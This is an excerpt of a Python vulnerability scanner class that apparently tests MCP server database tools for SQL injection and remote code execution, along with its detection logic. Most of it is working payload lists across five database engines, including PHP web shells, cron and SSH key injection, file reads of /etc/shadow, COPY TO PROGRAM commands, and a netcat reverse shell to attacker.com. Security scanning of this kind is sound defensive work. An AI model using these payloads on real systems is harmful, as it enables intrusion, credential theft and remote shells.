...
class SQLInjectionRCEScanner(BaseScanner):
    ...
    TIME_BASED_PAYLOADS = {
        ...
        "sqlite": [
            ...
            (
                "sqlite_recursive",
                "' UNION SELECT 1 FROM (WITH RECURSIVE cnt(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM cnt LIMIT 10000000) SELECT x FROM cnt);--",
                3,
            ),
        ],
        "oracle": [
    ...
    SQLITE_RCE_PAYLOADS = [
        ...
        (
            "attach_tmp",
            "'; ATTACH DATABASE '/tmp/mcpsec_sqli_test.db' AS pwned;--",
            "ATTACH to /tmp",
            "file_write",
        ),
        (
            "attach_tmp_win",
            "'; ATTACH DATABASE 'C:\\Windows\\Temp\\mcpsec_test.db' AS pwned;--",
            "ATTACH to Windows temp",
            "file_write",
        ),
        (
            "attach_var_tmp",
            "'; ATTACH DATABASE '/var/tmp/mcpsec_test.db' AS pwned;--",
            "ATTACH to /var/tmp",
            "file_write",
        ),
        # Web shell attempts
        (
            "attach_webroot_linux",
            "'; ATTACH DATABASE '/var/www/html/mcpsec.php' AS pwned; CREATE TABLE pwned.x(y TEXT); INSERT INTO pwned.x VALUES('<?php system($_GET[\"c\"]);?>');--",
            "PHP shell to webroot",
            "webshell",
        ),
        (
            "attach_webroot_nginx",
            "'; ATTACH DATABASE '/usr/share/nginx/html/mcpsec.php' AS pwned;--",
            "ATTACH to nginx webroot",
            "webshell",
        ),
        # Cron job injection
        (
            "attach_cron",
            "'; ATTACH DATABASE '/etc/cron.d/mcpsec_test' AS pwned; CREATE TABLE pwned.x(y TEXT); INSERT INTO pwned.x VALUES('* * * * * root id > /tmp/pwned');--",
            "Cron job injection",
            "rce",
        ),
        (
            "attach_cron_user",
            "'; ATTACH DATABASE '/var/spool/cron/crontabs/root' AS pwned;--",
            "User crontab injection",
            "rce",
        ),
        # SSH key injection
        (
            "attach_ssh",
            "'; ATTACH DATABASE '/root/.ssh/authorized_keys' AS pwned;--",
            "SSH key injection",
            "rce",
        ),
        (
            "attach_ssh_user",
            "'; ATTACH DATABASE '~/.ssh/authorized_keys' AS pwned;--",
            "User SSH key injection",
            "rce",
        ),
        # Load extension (if enabled)
        ("load_ext_so", "'; SELECT load_extension('/tmp/evil.so');--", "Load .so extension", "rce"),
        (
            "load_ext_dll",
            "'; SELECT load_extension('C:\\evil.dll');--",
            "Load .dll extension",
            "rce",
        ),
        (
            "load_ext_path_traversal",
            "'; SELECT load_extension('../../../tmp/evil');--",
            "Path traversal extension load",
            "rce",
        ),
        # Writeable functions via ATTACH
        (
            "attach_init",
            "'; ATTACH DATABASE ':memory:' AS mem; CREATE TABLE mem.init(x); INSERT INTO mem.init VALUES('malicious');--",
    ...
    POSTGRES_RCE_PAYLOADS = [
        ...
        (
            "copy_program_id",
            "'; COPY (SELECT '') TO PROGRAM 'id > /tmp/mcpsec_pg_pwned';--",
            "COPY TO PROGRAM id",
            "rce",
        ),
        (
            "copy_program_whoami",
            "'; COPY (SELECT '') TO PROGRAM 'whoami > /tmp/mcpsec_pg_whoami';--",
            "COPY TO PROGRAM whoami",
            "rce",
        ),
        (
            "copy_program_curl",
            "'; COPY (SELECT '') TO PROGRAM 'curl http://169.254.169.254/latest/meta-data/ -o /tmp/mcpsec_meta';--",
            "COPY TO PROGRAM SSRF",
            "rce",
        ),
        (
            "copy_program_wget",
        ...
        (
            ...
            "COPY TO PROGRAM bash",
            "rce",
        ),
        (
            "copy_program_nc",
            "'; COPY (SELECT '') TO PROGRAM 'nc -e /bin/sh attacker.com 4444';--",
            "COPY TO PROGRAM netcat",
            "rce",
        ),
        # COPY FROM/TO file operations
        (
            "copy_passwd",
            "'; CREATE TABLE mcpsec_test(t TEXT); COPY mcpsec_test FROM '/etc/passwd';--",
            "COPY FROM /etc/passwd",
            "file_read",
        ),
        (
            "copy_shadow",
            "'; COPY mcpsec_test FROM '/etc/shadow';--",
            "COPY FROM /etc/shadow",
            "file_read",
        ),
        (
            "copy_to_tmp",
            "'; COPY (SELECT 'test') TO '/tmp/mcpsec_pg_test';--",
            "COPY TO file",
            "file_write",
        ),
        # Large object operations
        ("lo_import", "'; SELECT lo_import('/etc/passwd');--", "Large object import", "file_read"),
        (
            "lo_export",
            "'; SELECT lo_export(12345, '/tmp/mcpsec_lo_test');--",
            "Large object export",
            "file_write",
        ),
        # Extension-based RCE
        (
            "create_ext_plpython",
            "'; CREATE EXTENSION plpythonu; CREATE FUNCTION mcpsec_rce() RETURNS text AS $$ import os; return os.popen('id').read() $$ LANGUAGE plpythonu;--",
            "PL/Python RCE",
            "rce",
        ),
        (
            "create_ext_plperl",
            "'; CREATE EXTENSION plperlu; CREATE FUNCTION mcpsec_rce() RETURNS text AS $$ return `id` $$ LANGUAGE plperlu;--",
            "PL/Perl RCE",
            "rce",
        ),
        (
            "create_ext_pltcl",
            "'; CREATE EXTENSION pltclu; CREATE FUNCTION mcpsec_rce() RETURNS text AS $$ exec id $$ LANGUAGE pltclu;--",
            "PL/Tcl RCE",
            "rce",
        ),
        # PostgreSQL file functions
        ("pg_read_file", "'; SELECT pg_read_file('/etc/passwd');--", "pg_read_file", "file_read"),
        (
            "pg_read_binary",
        ...
        ("pg_ls_dir", "'; SELECT pg_ls_dir('/etc');--", "pg_ls_dir", "file_read"),
        # dblink for SSRF
        (
            "dblink_ssrf",
            "'; SELECT * FROM dblink('host=169.254.169.254 dbname=metadata', 'SELECT 1') AS t(id int);--",
            "dblink SSRF",
            "ssrf",
        ),
    ]
    ...
    MYSQL_RCE_PAYLOADS = [
        ...
        (
            "outfile_tmp",
            "' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/tmp/mcpsec_shell.php'--",
            "INTO OUTFILE /tmp",
            "file_write",
        ),
        (
            "outfile_webroot",
            "' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/mcpsec.php'--",
            "INTO OUTFILE webroot",
            "webshell",
        ),
        (
            "outfile_win_temp",
            "' UNION SELECT 'test' INTO OUTFILE 'C:\\Windows\\Temp\\mcpsec.txt'--",
            "INTO OUTFILE Windows",
            "file_write",
        ),
        # INTO DUMPFILE - binary write
        (
            "dumpfile_tmp",
            "' UNION SELECT 0x3C3F7068702073797374656D28245F4745545B2263225D293B3F3E INTO DUMPFILE '/tmp/mcpsec.php'--",
            "INTO DUMPFILE PHP",
            "webshell",
        ),
        (
            "dumpfile_udf",
            "' UNION SELECT [UDF_BINARY] INTO DUMPFILE '/usr/lib/mysql/plugin/mcpsec.so'--",
            "INTO DUMPFILE UDF",
            "rce",
        ),
        # LOAD_FILE - file read
        ...
        (
            "loadfile_win",
            "' UNION SELECT LOAD_FILE('C:\\Windows\\system.ini')--",
            "LOAD_FILE Windows",
            "file_read",
        ),
        # UDF (User Defined Function)
        ("udf_check_plugin_dir", "' UNION SELECT @@plugin_dir--", "Check plugin dir", "probe"),
        (
            "udf_check_secure_file",
            "' UNION SELECT @@secure_file_priv--",
            "Check secure_file_priv",
            "probe",
        ),
        ("udf_check_version", "' UNION SELECT @@version--", "Check version", "probe"),
        # sys_exec UDF (if installed)
        ("udf_sys_exec", "'; SELECT sys_exec('id > /tmp/mcpsec_udf');--", "sys_exec UDF", "rce"),
        ("udf_sys_eval", "'; SELECT sys_eval('id');--", "sys_eval UDF", "rce"),
        # General Log for file write
        ("general_log_on", "'; SET global general_log = 'ON';--", "Enable general log", "probe"),
        (
            "general_log_file",
            "'; SET global general_log_file = '/tmp/mcpsec.php';--",
            "Set log file",
            "file_write",
        ),
        (
        ...
        # Slow query log
        ("slow_log_on", "'; SET global slow_query_log = 'ON';--", "Enable slow log", "probe"),
        (
            "slow_log_file",
            "'; SET global slow_query_log_file = '/tmp/mcpsec_slow.php';--",
            "Set slow log file",
            "file_write",
        ),
    ]
    ...
    MSSQL_RCE_PAYLOADS = [
        ...
        (
            "xp_cmdshell_enable_2",
            "'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--",
            "Enable xp_cmdshell",
            "probe",
        ),
        ("xp_cmdshell_whoami", "'; EXEC xp_cmdshell 'whoami';--", "xp_cmdshell whoami", "rce"),
        ("xp_cmdshell_id", "'; EXEC xp_cmdshell 'id';--", "xp_cmdshell id", "rce"),
        ("xp_cmdshell_dir", "'; EXEC xp_cmdshell 'dir C:\\';--", "xp_cmdshell dir", "rce"),
        ("xp_cmdshell_net", "'; EXEC xp_cmdshell 'net user';--", "xp_cmdshell net user", "rce"),
        (
            "xp_cmdshell_powershell",
            "'; EXEC xp_cmdshell 'powershell -c \"whoami\"';--",
        ...
        (
            "sp_oa_shell",
            "'; DECLARE @shell INT; EXEC sp_OACreate 'WScript.Shell', @shell OUT; EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd /c whoami > C:\\temp\\mcpsec.txt';--",
            "sp_OACreate shell",
            "rce",
        ),
        # File operations
        (
            "bulk_insert",
            "'; BULK INSERT mcpsec_test FROM 'C:\\Windows\\System32\\drivers\\etc\\hosts';--",
            "BULK INSERT hosts",
            "file_read",
        ),
        (
        ...
        ("xp_dirtree", "'; EXEC xp_dirtree 'C:\\';--", "xp_dirtree enumeration", "file_read"),
        (
            "xp_fileexist",
            "'; EXEC xp_fileexist 'C:\\Windows\\System32\\config\\SAM';--",
            "xp_fileexist SAM",
            "file_read",
        ),
        # Linked servers
        ("linked_servers", "'; SELECT * FROM sys.servers;--", "Enumerate linked servers", "probe"),
        (
            "openquery",
        ...
        (
            "sql_agent_job",
            "'; USE msdb; EXEC dbo.sp_add_job @job_name = ''mcpsec_test'';--",
    ...
    ORACLE_RCE_PAYLOADS = [
        ...
        (
            "java_shell",
            '\'; CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "mcpsec" AS import java.io.*; public class mcpsec { public static String exec(String cmd) throws IOException { return new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream())).readLine(); }};--',
            "Java stored procedure",
            "rce",
        ),
        ("java_exec", "'; SELECT mcpsec.exec('id') FROM dual;--", "Execute Java procedure", "rce"),
        # DBMS_SCHEDULER
        (
            "scheduler_job",
            "'; BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>''mcpsec'',job_type=>''EXECUTABLE'',job_action=>''/bin/bash'',number_of_arguments=>2,enabled=>FALSE); END;--",
            "DBMS_SCHEDULER job",
            "rce",
        ),
        # UTL_FILE
        (
            "utl_file_read",
            "'; DECLARE f UTL_FILE.FILE_TYPE; BEGIN f := UTL_FILE.FOPEN(''/etc'', ''passwd'', ''R''); END;--",
            "UTL_FILE read",
            "file_read",
        ),
        (
            "utl_file_write",
            "'; DECLARE f UTL_FILE.FILE_TYPE; BEGIN f := UTL_FILE.FOPEN(''/tmp'', ''mcpsec.txt'', ''W''); UTL_FILE.PUT_LINE(f, ''pwned''); UTL_FILE.FCLOSE(f); END;--",
            "UTL_FILE write",
            "file_write",
        ),
        # UTL_HTTP SSRF
        ...
        (
            "xmlquery_read",
            "'; SELECT DBMS_XMLQUERY.GETXML('SELECT * FROM v$version') FROM dual;--",
            "DBMS_XMLQUERY",
            "probe",
        ),
    ]
    ...
    async def scan(
        ...
        for tool in db_tools:
            ...
            # Measure specific tool baseline latency for time-based checks
            baseline_times = []
            param_name = params[0]
            for _ in range(3):
                start = time.time()
            ...
            self._baseline_latency = measure_baseline_latency(baseline_times)
    ...
    async def _detect_sqli(
        self, client: MCPSecClient, tool_name: str, param_name: str
    ) -> SQLiResult:
        ...
        for i, (name, payload, desc) in enumerate(self.BOOLEAN_BASED_PAYLOADS):
            if "true" in name:
                ...
                false_result = await self._test_payload(
                    client, tool_name, param_name, false_payload
                )
                ...
                if true_result != false_result and len(true_result) > len(false_result) * 0.5:
                    return SQLiResult(
                        ...
                        evidence="Boolean-based SQLi: different responses for true/false conditions",
                    )
        ...
        for name, payload, desc in self.UNION_BASED_PAYLOADS:
            ...
            if self._is_union_success(result):
                return SQLiResult(
                    ...
                    payload=payload,
                    response=result,
                    evidence="UNION-based SQLi detected",
                )

        # Try stacked queries
        baseline_response = await self._test_payload(
            client, tool_name, param_name, "test_baseline_value"
        )
        for name, payload, desc in self.STACKED_QUERY_PAYLOADS:
            result = await self._test_payload(client, tool_name, param_name, payload)
            if self._is_sqli_error(result) or self._is_blocked(result) or not result:
                continue
            # CRITICAL FP FIX: Only confirm if response DIFFERS from baseline
            # A tool that returns the same static response for any input is NOT injectable
            if (
                result.strip() == baseline_response.strip()
                or result.strip() == baseline_response.replace("test_baseline_value", "").strip()
            ):
                continue
            # Must also have some SQL-relevant content in response
            sql_indicators = [
                r"\d+\s+row",
                r"affected",
                r"inserted",
            ...
            if any(re.search(p, result, re.I) for p in sql_indicators):
                return SQLiResult(
                    vulnerable=True,
                    technique="stacked",
                    payload=payload,
                    response=result,
                    evidence="Stacked query SQLi detected: response differs from baseline and contains SQL markers",
                )
    ...
    async def _test_payload(
        self, client: MCPSecClient, tool_name: str, param_name: str, payload: str
    ) -> str:
        """Send a payload and return the response with the payload stripped"""
        call_args = {param_name: payload}

        # Populate other required parameters to bypass schema validation
        if hasattr(self, "current_profile"):
            tool = next((t for t in self.current_profile.tools if t.name == tool_name), None)
            if tool:
                for p_name, p_schema in tool.parameters.items():
                    if p_name != param_name:
                        ...
                        if p_type in ("integer", "number"):
                            ...
                            call_args[p_name] = True
                        else:
                            call_args[p_name] = "test"

        try:
            result = await asyncio.wait_for(client.call_tool(tool_name, call_args), timeout=10.0)
            response_text = self._extract_response_text(result)
            # Standard strip
            clean = response_text.replace(payload, "")
            # Handles repr() escaped variations (e.g. \xa0)
            clean = clean.replace(repr(payload)[1:-1], "")
            # Handle json encoded
            import json

            clean = clean.replace(json.dumps(payload)[1:-1], "")
            return clean
    ...
    async def _test_time_based(
        ...
        """Test for time-based SQLi with baseline comparison."""
        baseline = getattr(self, "_baseline_latency", 1.0)
        required_delay = max(expected_delay, baseline + 5.0)  # Must exceed baseline + 5s
        ...
        try:
            await asyncio.wait_for(
                client.call_tool(tool_name, call_args), timeout=required_delay + 5
            )
            elapsed = time.time() - start
            # Require delay to exceed baseline + 5s to avoid network jitter FPs
    ...
    def _is_blocked(self, response: str) -> bool:
        ...
        if (
            "only select queries are allowed" in lowercased
            or "only create table statements are allowed" in lowercased
            or "not supported" in lowercased
        ):
            return True
        return False
    ...
    def _is_sqli_error(self, response: str) -> bool:
        ...
        # Check for SAFE responses first (JSON-RPC errors, schema validation)
        from mcpsec.scanners.response_classifier import Verdict, classify_response

        if classify_response(response) == Verdict.SAFE:
            return False
    ...
    def _is_union_success(self, response: str) -> bool:
        ...
        # Check for SAFE responses first (schema validation, blocked attempts)
        from mcpsec.scanners.response_classifier import Verdict, classify_response
    ...
    async def _fingerprint_db(
        self, client: MCPSecClient, tool_name: str, param_name: str, sqli_result: SQLiResult
    ) -> str:
    ...
    async def _test_rce(
        self, client: MCPSecClient, tool_name: str, param_name: str, db_type: str
    ) -> list[Finding]:
    ...
    def _classify_rce_result(
        self, response: str, attack_type: str, payload: str
        ...
        for pattern in self.RCE_PARTIAL_INDICATORS:
            if re.search(pattern, response, re.I):
                return (
                    Severity.HIGH,
                    f"RCE feature exists but restricted or confirmed run: {pattern}",
                )
    ...
    def _create_sqli_finding(
        self, tool_name: str, param_name: str, sqli_result: SQLiResult
    ) -> Finding:
